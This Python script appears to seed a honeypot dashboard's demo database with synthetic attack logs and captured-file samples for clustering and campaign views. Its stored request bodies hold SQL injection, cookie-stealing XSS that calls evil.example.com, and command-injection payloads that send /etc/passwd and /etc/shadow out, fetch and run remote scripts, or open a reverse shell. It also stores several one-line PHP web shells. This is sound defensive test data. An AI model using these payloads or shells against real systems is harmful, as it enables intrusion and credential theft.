#!/usr/bin/env python3
"""
Seed the demo database with realistic-looking attack traffic so the Threats
tab, campaign chart, similar events, file index, and IP Insight panels
display meaningful data.

Idempotent: skips if it finds its own marker path (`/__seeded__/`).
"""

import os
import sys
from datetime import datetime, timedelta

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from database import get_database, initialize_database
from tlsh_utils import tlsh_available, tlsh_hash

DB_PATH = os.path.join(os.path.dirname(__file__), "..", "src", "data", "krawl.db")


def _raw(
    method,
    path,
    content_type,
    body,
    referer="",
    user_agent="Mozilla/5.0 (compatible; SeedBot/1.0)",
):
    headers = (
        f"Host: krawlme.com\r\n"
        f"Content-Type: {content_type}\r\n"
        f"User-Agent: {user_agent}\r\n"
    )
    if referer:
        headers += f"Referer: {referer}\r\n"
    return f"{method} {path} HTTP/1.1\r\n{headers}\r\n{body}"


def _now(day_offset, hour, minute, sec=0):
    base = datetime(2026, 9, 6, 21, 0, 0)  # near current local time
    return base - timedelta(
        days=day_offset,
        hours=base.hour - hour,
        minutes=base.minute - minute,
        seconds=base.second - sec,
    )


# ---------------------------------------------------------------------------
# Attack families
# ---------------------------------------------------------------------------


def _sql_inj_body(variant=0):
    bases = [
        "username=admin' OR '1'='1'--&csrf=R4nd0mSalt1234567890AbCdEfGhIjKlMnOpQrStUvWxYz1234567890",
        "user=root' UNION SELECT password FROM users WHERE 1=1--&csrf=R4nd0mSalt1234567890AbCdEfGhIjKlMnOpQrStUvWxYz",
        "username=admin'%20OR%20'1'='1'%20LIMIT%201%20--&csrf=R4nd0mSalt1234567890AbCdEfGhIjKlMnOpQrStUvWxYz12",
        "login=admin'/**/OR/**/1=1--&token=R4nd0mSalt1234567890AbCdEfGhIjKlMnOpQrStUvWxYz1234567890",
    ]
    return bases[variant % len(bases)]


def _xss_body(variant=0):
    bases = [
        "comment=<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>&page=1",
        "message=<img src=x onerror=alert(document.cookie)>&user=guest&ts=R4nd0mSalt12345",
        "input=<svg onload=fetch('https://evil.example.com/x?'+btoa(document.cookie))>&submit=Send",
        "text=<iframe src=javascript:alert(document.domain)>&ts=1234567890",
    ]
    return bases[variant % len(bases)]


def _cmd_body(variant=0):
    bases = [
        "cmd=ping%20-c%204%20$(cat%20/etc/passwd)%20%7C%20nc%20evil.example.com%204444&timeout=30",
        "action=eval&code=__import__('os').popen('cat /etc/shadow | curl -X POST -d@- http://evil.example.com').read()",
        "exec=;id%20%26%26%20curl%20http://evil.example.com/shell.sh%20%7C%20bash",
        'cmd=python3%20-c%20\'import%20socket,os;s=socket.socket();s.connect(("evil.example.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh")\'',
        "run=busybox wget http://evil.example.com/rk -O /tmp/rk && chmod +x /tmp/rk && /tmp/rk",
    ]
    return bases[variant % len(bases)]


# ---------------------------------------------------------------------------
# Seed plan
# ---------------------------------------------------------------------------
SEEDS = [
    # --- SQLi campaign: 3 IPs, Sep 2 and Sep 4, clustered together ---
    {
        "ip": "45.155.205.201",
        "day_offsets": [4, 2],  # Sep 2, Sep 4
        "path": "/login.php",
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "body_fn": _sql_inj_body,
        "n_per_day": 8,
        "cluster": True,
        "referer": "https://evil.example.com/bait-7a3f.html",
    },
    {
        "ip": "103.145.12.111",
        "day_offsets": [4, 2],
        "path": "/login.php",
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "body_fn": _sql_inj_body,
        "n_per_day": 7,
        "cluster": True,
        "referer": "https://evil.example.com/bait-7a3f.html",
    },
    {
        "ip": "91.240.118.172",
        "day_offsets": [4, 2],
        "path": "/search",
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "body_fn": _sql_inj_body,
        "n_per_day": 5,
        "cluster": True,
        "referer": "https://evil.example.com/bait-7a3f.html",
    },
    # --- XSS campaign: 2 IPs, Sep 3 and Sep 5 ---
    {
        "ip": "195.54.160.91",
        "day_offsets": [3, 1],  # Sep 3, Sep 5
        "path": "/feedback",
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "body_fn": _xss_body,
        "n_per_day": 6,
        "cluster": True,
        "referer": "https://evil.example.com/bait-x9c2.html",
    },
    {
        "ip": "203.0.113.42",
        "day_offsets": [3, 1],
        "path": "/feedback",
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "body_fn": _xss_body,
        "n_per_day": 5,
        "cluster": True,
        "referer": "https://evil.example.com/bait-x9c2.html",
    },
    # --- Command injection: 1 IP, Sep 4 ---
    {
        "ip": "89.248.165.58",
        "day_offsets": [2],
        "path": "/api/exec",
        "method": "POST",
        "content_type": "application/json",
        "body_fn": _cmd_body,
        "n_per_day": 5,
        "cluster": True,
        "referer": "",
    },
    # --- Credential stuffing: 1 IP, Sep 2, 09:xx ---
    {
        "ip": "5.188.206.14",
        "day_offsets": [4],
        "path": "/admin/login",
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "body_fn": lambda v: (
            f"username=admin&password=SuperSecret{v:03d}!@#$%^&csrf=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        ),
        "n_per_day": 18,
        "cluster": True,
        "start_hour": 9,
        "referer": "",
    },
    # --- Recon noise (unhashable GETs, creates referer history) ---
    {
        "ip": "176.113.84.130",
        "day_offsets": [4, 3, 2],
        "path": "/w00t.php",
        "method": "GET",
        "content_type": "",
        "body_fn": lambda v: "",
        "n_per_day": 4,
        "cluster": False,
        "start_hour": 14,
        "referer": "https://evil.example.com/bait-7a3f.html",
    },
    {
        "ip": "176.113.84.130",
        "day_offsets": [4, 3, 2],
        "path": "/admin",
        "method": "GET",
        "content_type": "",
        "body_fn": lambda v: "",
        "n_per_day": 3,
        "cluster": False,
        "start_hour": 15,
        "referer": "",
    },
    # --- Webshell probe GETs (path-only, adds variety to top paths) ---
    {
        "ip": "198.51.100.77",
        "day_offsets": [3, 2, 1],
        "path": "/shell.php",
        "method": "GET",
        "content_type": "",
        "body_fn": lambda v: "",
        "n_per_day": 3,
        "cluster": False,
        "start_hour": 16,
        "referer": "",
    },
]


def main():
    if not os.path.exists(DB_PATH):
        print(f"DB not found: {DB_PATH}")
        return

    initialize_database(DB_PATH)
    db = get_database()
    session = db.session
    try:
        from models import AccessLog, AttackDetection

        marker = (
            session.query(AccessLog.id)
            .filter(AccessLog.path.like("/__seeded__%"))
            .first()
        )
        if marker:
            print("Already seeded (found /__seeded__*). Skipping.")
            return

        total_logs = 0
        total_dets = 0
        attack_counter = 0

        for seed in SEEDS:
            ip = seed["ip"]
            path = seed["path"]
            method = seed["method"]
            ct = seed["content_type"]
            body_fn = seed["body_fn"]
            referer = seed.get("referer", "")
            start_hour = seed.get("start_hour", 14)

            for day_offset in seed["day_offsets"]:
                for i in range(seed["n_per_day"]):
                    ts = _now(day_offset, start_hour, 10 + i * 4 + (i % 3))
                    body = body_fn(i)
                    raw = _raw(
                        method,
                        path,
                        ct,
                        body,
                        referer=referer,
                        user_agent="Mozilla/5.0 SeedBot/1.0",
                    )
                    al = AccessLog(
                        ip=ip,
                        path=path,
                        user_agent="Mozilla/5.0 SeedBot/1.0",
                        method=method,
                        is_suspicious=True,
                        is_honeypot_trigger=False,
                        timestamp=ts,
                        raw_request=raw,
                        referer=referer or None,
                    )
                    session.add(al)
                    session.flush()  # get al.id

                    # Mark as attack
                    attack_type = (
                        "sql_injection"
                        if path in ("/login.php", "/search")
                        else (
                            "xss_attempt"
                            if path == "/feedback"
                            else (
                                "command_injection"
                                if path == "/api/exec"
                                else (
                                    "login_attempt"
                                    if path == "/admin/login"
                                    else "suspicious_pattern"
                                )
                            )
                        )
                    )
                    session.add(
                        AttackDetection(
                            access_log_id=al.id,
                            attack_type=attack_type,
                            matched_pattern=path,
                        )
                    )
                    total_logs += 1
                    total_dets += 1
                    attack_counter += 1

                # Add the /__seeded__/ marker (no attack, just an innocuous hit)
                marker_log = AccessLog(
                    ip=ip,
                    path="/__seeded__/marker",
                    user_agent="SeedMarker/1.0",
                    method="GET",
                    is_suspicious=False,
                    is_honeypot_trigger=False,
                    timestamp=_now(day_offset, start_hour + 1, 0),
                    raw_request=_raw("GET", "/__seeded__/marker", "text/plain", ""),
                    referer=None,
                )
                session.add(marker_log)

        session.commit()
        print(f"Inserted {total_logs} access logs, {total_dets} attack detections")

        # Seed file payloads (pre-hashed)
        if tlsh_available():
            import hashlib

            from models import CapturedPayload

            shell_variants = [
                (
                    "c99-v3.1.php",
                    "<?php eval($_GET['c']); echo md5(file_get_contents('/etc/passwd')); ?>"
                    "/* seedmortar-9f3c17a4 */",
                ),
                (
                    "r57-v1.41.php",
                    "<?php echo shell_exec($_GET['cmd']); ?>/* seedmortar-7b2e91c0 */",
                ),
                (
                    "b374k-v2.5.php",
                    "<?php @system($_REQUEST['c']); ?>/* seedmortar-5a8d46f1 */",
                ),
                (
                    "files-manager.php",
                    "<?php array_map('system', explode('|', $_REQUEST['c'])); ?>"
                    "/* seedmortar-3c7e920a */",
                ),
            ]
            first_ts = _now(5, 12, 30)  # Sep 1, a day earlier than SQLi
            pending_clusters = {}
            for i, (fname, content) in enumerate(shell_variants):
                ip = [
                    "185.220.101.34",
                    "45.155.205.233",
                    "103.145.12.99",
                    "91.240.118.172",
                ][i % 4]
                ts = first_ts + timedelta(hours=i * 6)
                content_bytes = content.encode()
                digest = tlsh_hash(content_bytes)
                sha = hashlib.sha256(content_bytes).hexdigest()
                cp = CapturedPayload(
                    access_log_id=1 + i,  # dummy, will be overwritten
                    ip=ip,
                    filename=fname,
                    content_type="application/x-php",
                    size=len(content_bytes),
                    tlsh_hash=digest,
                    sha256=sha,
                    timestamp=ts,
                )
                # assign to access_log 3253 + i (the 3 real POST logs exist)
                cp.access_log_id = 3253 + (i % 3)
                session.add(cp)
                session.flush()

                # Cluster like tracker does for captured files (inline, not
                # via _hash_files: rows with a tlsh_hash are skipped by it).
                # assign_cluster closes the shared session, so defer updates.
                pending_clusters[(cp.id, digest, ts)] = None
            session.commit()

            # assign_cluster closes the shared session (finally: close_session),
            # so re-open and write the cluster ids back in one pass.
            import database

            db = database.get_database()
            session = db.session
            for fid, digest, ts in list(pending_clusters):
                cid = db.payloads.assign_cluster(digest, ts)
                session = db.session
                session.query(CapturedPayload).filter_by(id=fid).update(
                    {"cluster_id": cid}
                )
                session.commit()
            print(f"Inserted {len(shell_variants)} shell file payloads")
        else:
            print("Skipping file payload seeding: py-tlsh not installed")

        # Run hash-payloads to cluster the new bodies
        from tasks.hash_payloads import main as hash_main

        hash_main()

        clusters = db.payloads.get_campaign_clusters()
        print(f"\nAfter seeding: {len(clusters)} campaign clusters")
        for c in clusters[:8]:
            print(
                f"  {c['rep_hash'][:8]}  ev={c['events']} ips={c['ips']} path={c['path']!r} types={c['attack_types']}"
            )

    finally:
        db.close_session()


if __name__ == "__main__":
    main()
